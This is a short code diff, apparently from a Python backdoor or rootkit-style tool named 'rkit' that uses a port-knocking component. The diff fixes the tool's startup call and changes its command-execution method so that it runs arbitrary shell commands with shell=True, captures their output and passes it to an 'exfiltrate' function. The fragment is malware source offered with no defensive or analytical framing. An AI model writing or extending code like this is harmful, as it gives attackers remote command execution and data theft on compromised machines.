@@ -15,7 +15,7 @@ code = "secret"
 
 def main():
     kit = rkit()
-    rkit.start()
+    kit.start()
 
 
 class rkit:
@@ -67,7 +67,8 @@ class rkit:
                 return 0
 
     def command_execute(self, command):
-        out = subprocess.call(command, shell=True)
+        #out = subprocess.call(command, shell=True)
+        out = subprocess.check_output(command, shell=True)
         self.knocker.exfiltrate(out, "/")
 
     def file_get(self, file):
